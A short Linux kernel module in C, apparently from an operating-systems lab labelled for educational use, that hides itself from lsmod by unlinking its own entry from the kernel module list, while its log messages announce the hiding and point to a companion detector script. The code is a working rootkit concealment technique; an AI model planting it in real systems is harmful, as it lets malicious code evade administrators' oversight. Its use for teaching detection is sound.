

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Lab SO - uso educativo");
MODULE_DESCRIPTION("Demo de ocultamiento de modulo (par con detector.sh)");
MODULE_VERSION("1.0");

static int __init ocultar_init(void)
{
	pr_alert("ocultar_demo: ===== CARGADO. Me voy a OCULTAR de lsmod =====\n");
	pr_alert("ocultar_demo: tecnica = list_del(THIS_MODULE->list)\n");

	
	list_del(&THIS_MODULE->list);

	pr_alert("ocultar_demo: listo. 'lsmod | grep ocultar_demo' ya no me muestra.\n");
	pr_alert("ocultar_demo: pero 'ls /sys/module/ | grep ocultar_demo' SI.\n");
	pr_alert("ocultar_demo: corre detector.sh para cazarme. Reinicia la VM para limpiar.\n");
	return 0;
}

static void __exit ocultar_exit(void)
{
	pr_alert("ocultar_demo: descargado.\n");
}

module_init(ocultar_init);
module_exit(ocultar_exit);
